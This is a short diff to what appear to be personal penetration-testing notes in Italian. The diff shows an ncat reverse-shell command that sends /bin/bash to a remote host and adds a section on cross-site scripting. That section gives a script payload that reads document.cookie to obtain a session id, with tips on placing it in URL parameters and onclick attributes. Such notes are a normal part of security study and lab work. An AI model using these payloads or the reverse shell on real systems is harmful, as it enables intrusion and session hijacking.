@@ -76,3 +76,9 @@ ncat 10.0.0.1 4242 -e /bin/bash
 ```
 
 
+# XSS
+```<script>alert(document.cookie)</script>``` è quello che mediamente mi può interessare per idSession
+
+1. prova a metterlo nella URL se puoi dopo il ?
+2. prova a metterlo in un button come `onclick=alert(document.cookie)`
+3. prova a metterlo nella URL dopo una GET/POST con `&<script>alert(document.cookie)</script>`
